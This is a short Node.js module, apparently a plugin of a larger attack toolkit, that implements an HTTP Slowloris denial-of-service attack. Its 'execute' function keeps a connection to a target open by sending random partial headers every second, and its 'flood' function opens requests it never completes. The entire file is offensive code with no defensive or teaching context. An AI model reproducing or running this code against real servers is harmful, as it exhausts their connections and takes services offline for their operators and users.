const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Slowloris',
    description: 'Slowloris attack - incomplete headers',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: { 'X-Slow': 'Starting...' }
            });
            
            req.on('error', reject);
            
            // Keep connection alive by sending partial headers
            let interval = setInterval(() => {
                req.write('X-Slowloris: ' + Math.random() + '\r\n');
            }, 1000);
            
            setTimeout(() => {
                clearInterval(interval);
                req.destroy();
                resolve({ slowloris: true, duration: 10000 });
            }, 10000);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            method: 'GET'
        });
        
        // Don't complete the request
        req.on('error', () => callback(false));
        callback(true);
    }
};